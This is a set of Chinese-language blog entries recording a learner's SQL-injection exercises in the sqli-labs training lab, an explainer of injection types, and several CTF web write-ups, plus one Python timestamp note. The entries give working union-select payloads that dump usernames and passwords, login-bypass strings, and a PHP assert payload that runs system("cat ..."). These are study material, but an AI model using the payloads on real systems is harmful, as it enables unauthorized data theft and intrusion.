    <content><![CDATA[<h2 id="sql语句之where字句学习笔记"><a href="#sql语句之where字句学习笔记" class="headerlink" title="sql语句之where字句学习笔记"></a>sql语句之where字句学习笔记</h2><a id="more"></a>

<p>我们先说一下wherer字句作用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">限制表中的数据返回  符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉</span><br></pre></td></tr></table></figure>
<p>1.两个极限条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">where 1 &#x3D; 1</span><br><span class="line">where 1 &#x3D; 2</span><br></pre></td></tr></table></figure>
<p>自我感觉一般用来完善sql语法补齐引号<br>2.字符串条件的表达<br>就像我们爆表的那个常用语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>先说明一下<br>table_schema 的意思是数据库名<br>database()是返回当前的数据库名<br>因此此处的where意思是指：<br>查询的范围被限定在了此数据库中，即起到约束作用<br>3.模糊查询<br>格式为：<br>like（像）+ 通配符</p>
<pre><code>（1）    “%”为通配符，代表0 - n个任意字符
（1）“-”代表一个任意字符</code></pre><p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM news WHERE keyword like &#39;%$keyword%&#39;</span><br></pre></td></tr></table></figure>
<p>意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">where  name like  ‘_$keyword%’</span><br></pre></td></tr></table></figure>
<p>这个就是查询中间为我们所输入的字符串<br>@<br>当我们要查询例如’$keyword_’时，我们要进行转义<br>即使用\</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">where name like &#39;$keyword\_%&#39;</span><br></pre></td></tr></table></figure>
<p>4.还有使用一些条件链接符号<br>进行限制条件</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-lab 学习记录less2</title>
    <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/</url>
    <content><![CDATA[<h1 id="sqli-lab-学习记录less2"><a href="#sqli-lab-学习记录less2" class="headerlink" title="sqli-lab 学习记录less2"></a>sqli-lab 学习记录less2</h1><a id="more"></a>

<p>less2<br>1.我们先来判断这次的sql注入类型<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>发现第一个语句返回正确<br>但是第二个却有了报错<br>我们因此可以判断<br>这次的sql注入类型为数字类型</p>
<!-- more -->
<p>2.<br>之后和less1一样<br>我们进行暴表的名字（暴表）<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>我们由此得到<br><img src="https://img-blog.csdnimg.cn/20190316101700495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.我们之后开始爆列喽<br>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<p>我们可以得到<br><img src="https://img-blog.csdnimg.cn/20190316102305663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.最后我们来获得我们要得到的东西<br>输入代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(id,username,password),3 from users</span><br></pre></td></tr></table></figure>
<p>就得到了我们要得到的东西<br><img src="https://img-blog.csdnimg.cn/20190316104403774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">另外<br>我们附加关于where的知识</p>
<p>table_schema是数据库名<br>database()函数会返回当前的数据库名<br><img src="https://img-blog.csdnimg.cn/20190316104540872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190316104550458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>where就是约束条件<br>这个 where后面  就是为了约束一下 我要查询的数据库  而不是去  看其他数据库里的东西<br>我要看的 东西 就是 当前数据库database里的  不是其他的数据里的<br>比如 有两个数据库  数据库1  数据库2   当前的数据库database是数据库1   你可以 where table_schema=database() 或者是where table_schema=’数据库1’</p>
]]></content>
  </entry>
  <entry>
    <title>sql注注入类型解释</title>
    <url>/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<h1 id="sql注入类型简单记录"><a href="#sql注入类型简单记录" class="headerlink" title="sql注入类型简单记录"></a>sql注入类型简单记录</h1><a id="more"></a>

<p>sql注入类型简单记录<br>1.sql注入流程<br>（1）判断注入点<br>（2）判断注入类型<br>（3）判断数据库类型<br>（3）获得数据库数据，提权<br>一、判断注入点</p>
<p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般有三类<br>Get参数触发SQL注入<br>POST参数触发SQL注入<br>Cookie触发SQL注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般我们输入&#39;来判断 是否存在注入点</span><br><span class="line">如果页面返回错误，则存在 Sql 注入</span><br><span class="line">原因是：</span><br><span class="line">原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</span><br></pre></td></tr></table></figure>
<p>二、判断注入类型<br>我们来了解一下：<br>有以下几种注入类型：<br>（1）数字型注入点<br>（2）字符型注入点<br>（3）搜索型注入点<br>（4）内嵌式sql注入<br>（5）终止试sql注入<br>之后我们进行解释：<br>1.数字型注入点<br>测试方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;1 返回成功</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;2 返回失败</span><br></pre></td></tr></table></figure>

<p>为什么呢</p>
<p>假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id<br>那么这个$id 即为用户提交的</p>
<p>当我们输入的是100 and 1=1<br>语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1<br>对于and</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了</span><br><span class="line"></span><br><span class="line">而在and右边，1&#x3D;1也是恒成立的，所以整个语句返回的是成功</span><br><span class="line"></span><br><span class="line">当然，如果后面改成了1&#x3D;2的话，因为1&#x3D;2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1&#x3D;2最后会返回的是失败</span><br></pre></td></tr></table></figure>
<p>因此我们可以这样进行判断<br>2.字符型注入点<br>测试方法：</p>
<p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’1 返回成功</p>
<p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’2返回失败</p>
<p>这里就使上面的数字型变为了字符型</p>
<p>原因如下：</p>
<pre><code>还是假设我们网站的SQL语句是这样的
SELECT * FROM news WHERE name=&apos;$name&apos;
当我们构造输入为下面这个的时候
man&apos; and &apos;1&apos;=&apos;1
语句就变成了
SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;</code></pre><p>发现什么了没？这个SQL已经闭合了</p>
<pre><code>还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功
同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符</code></pre><p>比如这样</p>
<pre><code>http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功
http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 </code></pre><p>3.搜索式sql注入</p>
<p>测试方法</p>
<p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=1 and ‘%’=’</p>
<p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=2 and ‘%’=’</p>
<p>假设我们的SQL查询语句是这样的</p>
<pre><code>SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos;

这里的$keyword是用户的输入

当我们输入以下语句的时候
pt%&apos; and 1=1 and &apos;%&apos;=&apos;
最终我们得到的语句是这样的
SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos;
这个语句又一次的闭合了</code></pre><p>这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误</p>
<p>我们可以把这个语句分为三段</p>
<pre><code>SELECT * FROM news WHERE keyword like &apos;%python%&apos;

and 1=1

and &apos;%&apos;=&apos;%&apos;

第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入）

第二句也是，第三句也是，因为自己肯定等于自己啊

但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理</code></pre><p>4.内嵌式sql注入<br>内联注入是指查询注入SQL代码后，原来的查询仍然全部执行</p>
<p>假设我们的网站SQL查询语句是这样的</p>
<p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p>
<p>这一看就是个登录页面的代码</p>
<pre><code>假如我们构造如下语句提交到登录框中的username

&apos; or &apos;&apos;=&apos;

或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法

提交到username我们的语句就会成为这样

SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>fuzz是我们随便输入的字符串</p>
<pre><code>而提交到password则会是这样的

SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;</code></pre><p>注:<br>    在SQL语句中，AND的优先级是大于OR的<br>    先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句</p>
<p>这是username框的</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;

or

&apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>或者password框的是这样</p>
<pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;

or

&apos;&apos;=&apos;&apos;</code></pre><p>我们首先用第一个来分析</p>
<p>首先计算AND之后</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;返回失败

or

&apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;返回失败</code></pre><p>数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的</p>
<p>但是我们的password情况就不一样了</p>
<pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;

or

&apos;&apos;=&apos;&apos;</code></pre><p>这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功</p>
<p>返回成功之后我们就会绕过登录表单直接登录系统了<br>5.终止式sql注入<br>终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句</p>
<p>于是被注释的查询不会被执行，我们还是拿上面那个例子举例</p>
<pre><code>我们上面已经知道，在username框内填入

&apos; or &apos;&apos;=&apos;

程序是不会返回成功的，我们就没有办法在username做文章了吗？</code></pre><p>错了，我们还有终止式</p>
<p>还是上面那个SQL查询语句</p>
<p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p>
<p>这里我们构造如下username输入</p>
<pre><code>&apos; or &apos;&apos;=&apos;&apos; --</code></pre><p>之后我们就可以得到如下的查询语句</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;</code></pre><p>这里的fuzz是我们随便输入的，–是注释符</p>
<p>这样，我们的语句就可以分为三个部分了</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;

or &apos;&apos;=&apos;&apos; 返回成功

--&apos; AND password =&apos;fuzz&apos;</code></pre><p>第一句肯定是返回失败的，但是我们第二句会返回成功</p>
<p>后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录</p>
<p>下面是我们常见的一些终止方式<br>终止字符串：</p>
<p>– ， #， %23， %00， /*<br>终止方法：</p>
<p>– , ‘– , ‘)– , ) – , ‘)) –, ))–</p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>sqli-lab 学习记录 less3-less4</title>
    <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/</url>
    <content><![CDATA[<h2 id="sqli-lab-学习记录-less3-less4"><a href="#sqli-lab-学习记录-less3-less4" class="headerlink" title="sqli-lab 学习记录  less3-less4"></a>sqli-lab 学习记录  less3-less4</h2><a id="more"></a>

<p>less3:<br>进入界面<br>我们先进行判断注入的类型<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>有正常回显<br>之后我们在输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line"></span><br><span class="line">发现出现了：</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190319192230358.png)根据后面的报错我们可以大致的判断此sql语句是这样的：</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
<p>之后呢，我们来验证我们的判断<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;) %23</span><br></pre></td></tr></table></figure>
<p>得到正常回显<br><img src="https://img-blog.csdnimg.cn/20190319192814704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此我们就确定了注入类型<br>之后的步骤就和我们之前做less1与2一样了<br>这里就不过多解释了</p>
<p>less4<br>我们还是一样判断注入类型<br>(这个类型与less3相似，但是爆出错误却很难)<br>我刚开始输入了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>均有回响<br>弄得我一脸懵逼<br>之后尝试使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
<p>终于爆出了错误<br><img src="https://img-blog.csdnimg.cn/2019031920140258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从错误中我们大致可以判断<br>应该是类似于<br>（“ $id ”）<br>我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;) %23</span><br></pre></td></tr></table></figure>
<p>得到正常回显<br>之后我们的步骤和之前一样就可以了</p>
<p>萌新文章，还请大佬们指导<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-lab less1</title>
    <url>/2019/12/16/sqli-lab%20less1/</url>
    <content><![CDATA[<h2 id="sqli-lab-学习记录"><a href="#sqli-lab-学习记录" class="headerlink" title="sqli-lab  学习记录"></a>sqli-lab  学习记录</h2><a id="more"></a>

<p>Less 1<br>1，我们先要爆出他的字段数，即列的数目<br>插入知识：<br>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。<br>感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。<br>数据库拥有一个名为tables的数据表，<br>该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。</p>
<p>’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）<br>’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）<br>我们使用如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 %23</span><br><span class="line">?id&#x3D;1&#39; order by 2 %23</span><br><span class="line">?id&#x3D;1&#39; order by 3 %23</span><br></pre></td></tr></table></figure>
<p>当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列<br>对了，要判断注入点<br>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>


<p>会报错<br>显示<br><img src="https://img-blog.csdnimg.cn/20190314203258751.png" alt="在这里插入图片描述">所以差不多我们输入的就放在了这对引号内<br>ok<br>2.之后我们进行爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure>
<p>得到了<br><img src="https://img-blog.csdnimg.cn/20190314203625178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们判断用户名在users中<br>之后爆列喽<br>附加一些资料<br><img src="https://img-blog.csdnimg.cn/20190314204021330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/2019031420403782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23</span><br></pre></td></tr></table></figure>
<p>得到：<br><img src="https://img-blog.csdnimg.cn/20190314204850959.png" alt="在这里插入图片描述">之后我们再得到我们需要的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23</span><br></pre></td></tr></table></figure>
<p>最后我们就得到了我们想要的：<br><img src="https://img-blog.csdnimg.cn/20190314205154204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">累死了，，，加油吧</p>
]]></content>
  </entry>
  <entry>
    <title>jarvis OJ web babyphp</title>
    <url>/2019/12/16/jarvis%20OJ%20web%20babyphp/</url>
    <content><![CDATA[<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><a id="more"></a>

<p>考完二级后我又要回归web狗了<br>今天做到一道web题<br>上题：<br><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p>
<p>进入后：<br>发现应该有git泄露<br>因此我们使用githack进行获得源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打开cmd</span><br><span class="line">输入：python2 GitHack.py http:&#x2F;&#x2F;web.jarvisoj.com:32798&#x2F;.git&#x2F;</span><br><span class="line">#这里的python2是我设置的用于区分python3</span><br><span class="line">即这个脚本要使用python2</span><br></pre></td></tr></table></figure>
<p>之后我们得到源码：</p>
<p>当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了<br><img src="https://img-blog.csdnimg.cn/20190402200211913.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190402200311594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们重点来看这里：<br>assert（）函数<br><img src="https://img-blog.csdnimg.cn/20190402200415600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我也不算太懂，但是只要是这一句话<br>如果assertion是字符串，那么此字符串会被当做php代码执行<br>因此我们就可以进行php注入（我的第一次php注入）<br>我们在url后面输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;&#39;. system(&quot;cat templates&#x2F;flag.php&quot;).&#39;</span><br></pre></td></tr></table></figure>
<p>这个代码的意思是打开flag.php 所在的templates文件中的此文件<br>为什么知道他在那里，因为有：<br><img src="https://img-blog.csdnimg.cn/20190402203454570.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190402203521735.png" alt="在这里插入图片描述"></p>
<p>输入payload后我们查看源代码得到flag<br><img src="https://img-blog.csdnimg.cn/20190402203613988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）</p>
]]></content>
  </entry>
  <entry>
    <title>python将时间戳转化为时间</title>
    <url>/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<h1 id="python将时间戳转化为时间"><a href="#python将时间戳转化为时间" class="headerlink" title="python将时间戳转化为时间"></a>python将时间戳转化为时间</h1><a id="more"></a>

<p>title:第一篇博客：python时间转换（将时间戳转化为时间）<br>date: 2019-02-014 22:37:58<br>tags:<br>    python的os.path模块中有着这样的一个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.path.getatime()    #获得文件的最近访问时间</span><br><span class="line">os.path.getctime()    #获得文件的创建时间</span><br><span class="line">os.path.getmtime()   #获得文件的修改时间</span><br></pre></td></tr></table></figure>
<p>我们就以第一个函数为例<br>os.path.getatime()<br>1.首先使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.localtime()     #将其转换为localtime的格式</span><br></pre></td></tr></table></figure>
<p>2.将转化过来的时间进行格式化，使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)    #temp为转化过来的localtime格式时间</span><br></pre></td></tr></table></figure>
<p>3.最后输出就行了<br>完整的过程如下所示：`</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">temp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))</span><br><span class="line">#获取python.exe的最近访问时间，并将其localtime化</span><br><span class="line">temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)</span><br><span class="line">#将temp格式化</span><br><span class="line">print(temp1)</span><br></pre></td></tr></table></figure>
<p>（这是我第一次写博客，有啥不好的，大佬指教）<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
    <title>issctf     web1</title>
    <url>/2019/12/16/issctf%20%20%20%20%20web1/</url>
    <content><![CDATA[<h2 id="标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）"><a href="#标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）" class="headerlink" title="标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）"></a>标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）</h2><a id="more"></a>

<p>题目涉及知识点：<br>1.php 中的几个函数（等会列举）<br>2.php parse_str引起的变量覆盖漏洞</p>
<!--more-->
<p>一、<br>我们要了解的php函数即方法<br>$<em>SERVER[‘REQUEST_URI’]<br>parse_url<br>parse_str<br>二、<br>由parse_str引起的变量覆盖漏洞<br>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>ok<br>三、<br>接下来打开题目<br>&lt;?php<br>error_reporting(0);<br>include(“flag.php”); $hashed_key = ‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($<em>SERVER[‘REQUEST_URI’]);<br>if(isset($parsed[“query”])){<br>    $query = $parsed[“query”];<br>    $parsed_query = parse_str($query);<br>    if($parsed_query!=NULL){<br>        $action = $parsed_query[‘action’];<br>    }<br>    if($action===”auth”){<br>        $key = $_GET[“key”];<br>        $hashed_input = hash(‘sha256’, $key);<br>        if($hashed_input!==$hashed_key){<br>            die(“<img src='cxk.jpg'>“);<br>        }<br>        echo $flag;<br>    }<br>}else{<br>    show_source(__FILE</em></em>);<br>}?&gt;</p>
<p>我们只需构造一个get传入<br>是action=auth<br>且将<br>hashed_key变量进行覆盖，传入你想传入的经过sha256后的值<br>最后传入key即可<br>样本<br>?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx</p>
]]></content>
  </entry>
  <entry>
    <title>flag.php bugku  web</title>
    <url>/2019/12/16/flag.php%20bugku%20%20web/</url>
    <content><![CDATA[<h2 id="bugku-web-flag-php"><a href="#bugku-web-flag-php" class="headerlink" title="bugku    web        flag.php"></a><strong>bugku    web        flag.php</strong></h2><a id="more"></a>

<p>打开题目网页<br>首先尝试了一下简单的sql注入<br>但是没用<br><img src="https://img-blog.csdnimg.cn/20190308190046343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">想了一会后，发现提示hint<br>所以我们尝试一下使用get方法传入hint任意值<br>即?hint=1<br>传入后发现一页代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; 